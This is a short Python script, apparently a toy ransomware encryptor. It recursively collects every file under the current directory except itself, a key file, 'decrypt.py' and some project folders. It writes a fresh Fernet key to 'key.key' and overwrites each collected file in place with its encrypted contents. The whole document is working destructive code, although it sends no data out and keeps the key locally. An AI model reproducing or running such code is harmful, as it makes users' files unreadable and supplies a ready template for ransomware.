from cryptography.fernet import Fernet
import os 

files = []
thisFile = os.path.basename(__file__)
keyFile = "key.key"
safes = [thisFile, keyFile, "decrypt.py", "node_modules", ".next", ".git"]

def addFiles(path):
    for file in os.listdir(path):

        if file in safes:
            continue

        if not (os.path.isfile(f"{path}/{file}")):
            addFiles(f"{path}/{file}")
            continue

        files.append(F"{path}/{file}")

addFiles(".")
print(files)

key = Fernet.generate_key()
with open(keyFile, "wb") as k :
    k.write(key)

fer = Fernet(key)

for f in files:
    with open(f, "rb") as r:
        content = r.read()
        encrypted_content = fer.encrypt(content)
    
    with open(f, "wb") as w:
        w.write(encrypted_content)

print("Every file is changed")